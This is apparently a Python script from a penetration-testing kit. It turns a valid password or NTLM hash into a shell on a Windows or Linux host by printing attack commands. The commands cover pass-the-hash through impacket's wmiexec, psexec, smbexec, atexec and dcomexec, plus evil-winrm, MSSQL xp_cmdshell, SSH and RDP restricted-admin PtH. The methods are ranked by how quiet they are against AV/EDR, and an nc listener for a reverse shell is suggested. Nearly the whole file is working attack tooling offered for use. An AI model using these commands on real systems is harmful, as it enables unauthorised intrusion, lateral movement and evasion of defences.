#!/usr/bin/env python3
"""CREDENTIAL / HASH -> SHELL (Bucket D). Turns a valid credential into code execution — i.e. THE
foothold the privesc kits assume. Supports Pass-the-Hash. PRINTS the commands (attacker box).

The shell you get feeds straight into privesc:
  - LOCAL/DOMAIN ADMIN cred  -> psexec/smbexec/winrm give SYSTEM/admin directly (still enumerate for the report).
  - LOW-PRIV cred            -> a user shell -> paste winpriv/enum.bat (Windows) or run linpriv/enum.sh (Linux).
  - MSSQL sysadmin           -> xp_cmdshell as the SQL SERVICE ACCOUNT (usually SeImpersonate) = privesc ROUTE 1.

Usage:
  python3 gen_shell.py --target 10.0.0.5 --user administrator --pass 'P@ss' [--proto smb|winrm|mssql|ssh|rdp]
  python3 gen_shell.py --target 10.0.0.5 --user admin --hash <NTLM> --proto smb     # Pass-the-Hash
"""
import sys
import _network_common as P

def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

t     = opt("--target", "<target>")
user  = opt("--user", "<user>")
pw    = opt("--pass")
nt    = opt("--hash")
dom   = opt("--domain", P.DOMAIN)
proto = opt("--proto", "smb")
who   = (f"{dom}/" if dom else "") + user
# impacket target string:  DOMAIN/user:pass@host   OR   DOMAIN/user@host -hashes :NT
tgt_impacket = (f"{dom}/" if dom else "") + user + (f":'{pw}'" if pw and not nt else "") + f"@{t}"
auth = f"-hashes :{nt}" if nt else ""
val_svc = "mssql" if proto == "mssql" else "smb"
val_cred = f"-H {nt}" if nt else f"-p '{pw or '<pass>'}'"

print(f"# FOOTHOLD  proto={proto}  user={who}  target={t}  ({'PtH' if nt else 'password'})")
print(f"# needs: a VALID credential — a password (--pass) or an NTLM hash (--hash <NTLM>). <x> = you supply.")
print(f"# validate the cred first + is it admin?  nxc {val_svc} {t} -u {user} {val_cred}   (a hit shows (Pwn3d!) if admin)")
print(f"# -> ok: nxc prints [+] {who}:... — (Pwn3d!) on that line means this cred is LOCAL ADMIN here.\n")

if proto == "smb":
    print(f"# needs: this cred is LOCAL ADMIN on {t} (the nxc check above showed (Pwn3d!)).")
    print(f"# SMB exec — pick ONE. Ordered quietest -> loudest (try the top one FIRST):")
    print(f"wmiexec.py {tgt_impacket} {auth}      # (try first) runs as the USER via WMI — NO service, quieter")
    print(f"atexec.py  {tgt_impacket} {auth} whoami   # one command via scheduled task")
    print(f"dcomexec.py {tgt_impacket} {auth}     # via DCOM")
    print(f"smbexec.py {tgt_impacket} {auth}      # SYSTEM, semi-service")
    print(f"psexec.py  {tgt_impacket} {auth}      # LAST resort: SYSTEM but CREATES A SERVICE (event 7045, AV/EDR loud)")
    print(f"# -> ok: you land at a shell prompt on {t}. `whoami` confirms the identity.")
    print(f"# -> psexec/smbexec land you as SYSTEM (privesc may be unnecessary — but still run enum for the report).")
    print(f"# -> wmiexec runs as the user: if not admin, paste  winpriv/enum.bat  to escalate.")
elif proto == "winrm":
    cred = f"-H {nt}" if nt else f"-p '{pw or '<pass>'}'"
    print(f"# needs: the user is in 'Remote Management Users' or is admin, and 5985/5986 (WinRM) is open.")
    print(f"# WinRM — interactive shell as the user:")
    print(f"evil-winrm -i {t} -u {user} {cred}" + (f" -r {dom}" if dom else ""))
    print(f"# -> ok: you get an  *Evil-WinRM* PS ...>  prompt. If not admin, run winpriv enum (upload/paste enum.bat).")
elif proto == "mssql":
    cred = f"-hashes :{nt}" if nt else ""
    wauth = " -windows-auth" if (dom or nt) else ""   # NTLM/PtH is a Windows-auth op even for a LOCAL acct
    login = f"{dom+'/' if dom else ''}{user}{':'+repr(pw)[1:-1] if pw and not nt else ''}@{t}"
    print(f"# needs: this login is a MSSQL SYSADMIN (to enable xp_cmdshell) and 1433 is open.")
    print(f"# MSSQL — this is the privesc ROUTE 1 entry channel (SQL service acct usually holds SeImpersonate):")
    print(f"mssqlclient.py '{login}'{wauth} {cred}")
    print(f"#   then in the SQL shell:  enable_xp_cmdshell   (or the sp_configure T-SQL)")
    print(f"#   -> ok:  EXEC master..xp_cmdshell 'whoami /priv'  runs and lists SeImpersonatePrivilege -> winpriv Route 1 (gen_full/forma/nonet)")
elif proto == "ssh":
    print(f"# needs: 22 (SSH) open + this account allowed to log in.")
    print(f"# SSH (Linux) — interactive shell as the user:")
    print(f"ssh {user}@{t}    # password: '{pw or '<pass>'}'   (key? ssh -i key {user}@{t})")
    print(f"# -> ok: you get a shell prompt on {t}. Then run  linpriv/enum.sh  to escalate (sudo -l first).")
elif proto == "rdp":
    print(f"# needs: 3389 (RDP) open + this account allowed Remote Desktop.")
    print(f"# RDP — interactive GUI session as the user:")
    print(f"xfreerdp /u:{user} /p:'{pw or '<pass>'}' /v:{t} +clipboard /cert:ignore" + (f" /d:{dom}" if dom else ""))
    print(f"# (PtH RDP needs Restricted Admin mode: xfreerdp /u:{user} /pth:{nt} /v:{t})" if nt else "")
    print(f"# -> ok: a desktop session opens. Then run winpriv enum in the session.")
else:
    print(f"# unknown proto '{proto}' — use: smb|winrm|mssql|ssh|rdp"); sys.exit(1)

print(f"\n# start a catcher if you pivot to a revshell:  nc -lvnp {P.LPORT}")
print(f"# NOTE: psexec/smbexec (service creation) and any dropped binary are AV/EDR-visible — prefer wmiexec/winrm.")
print(f"# NEXT: enumerate for privesc + the report even if you're already admin (document every path).")
